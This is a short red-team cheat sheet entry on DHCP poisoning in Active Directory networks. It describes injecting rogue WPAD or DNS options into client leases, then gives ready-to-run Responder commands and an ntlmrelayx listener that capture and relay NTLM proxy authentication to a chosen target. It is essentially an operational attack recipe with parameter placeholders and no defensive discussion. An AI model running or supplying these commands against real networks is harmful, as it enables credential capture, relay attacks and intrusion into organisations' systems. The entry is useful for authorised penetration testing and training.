---
technique: DHCPPoisoning
category: mitm
targets: Windows Clients
protocols: DHCP, WPAD, DNS, HTTP
remote_capable: true
tags: mitm dhcp-poisoning responder wpad dns ntlm-capture relay ad
---

# DHCPPoisoning

DHCP poisoning races the legitimate DHCP server and injects attacker-controlled network options into a client lease. In AD environments, the common path is option 252 WPAD injection to force proxy authentication, or DNS injection to steer name resolution.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Broadcast reachability | The attacker must receive client DHCP requests |
| Race window | Poisoning works when the rogue response reaches the client first |
| Follow-on listener | WPAD poisoning needs Responder or relay tooling ready for HTTP proxy auth |

## Linux

### Responder DHCP DNS injection

#python #responder #dhcp #dns

Inject a rogue DNS server through DHCP and force WPAD proxy authentication.

```sh title:"Start Responder DHCP poisoning with DNS injection"
responder -I "$interface" -wPdD
```
<!-- cheat
var interface
-->

### Responder DHCP WPAD injection

#python #responder #dhcp #wpad

Inject a rogue WPAD server through DHCP and force proxy authentication.

```sh title:"Start Responder DHCP poisoning with WPAD injection"
responder -I "$interface" -wPd
```
<!-- cheat
var interface
-->

### Responder DHCP relay mode

#python #responder #dhcp #wpad

Inject WPAD over DHCP without forcing proxy auth locally so relay tooling can handle authentication.

```sh title:"Start Responder DHCP WPAD injection for relay"
responder -I "$interface" -wd
```
<!-- cheat
var interface
-->

### ntlmrelayx WPAD relay listener

#python #impacket #relay #wpad

Listen for WPAD proxy authentication on port 3128 and relay it to a target.

```sh title:"Start ntlmrelayx HTTP proxy relay listener"
ntlmrelayx.py -t "$relay_target" --http-port 3128
```
<!-- cheat
var relay_target
-->
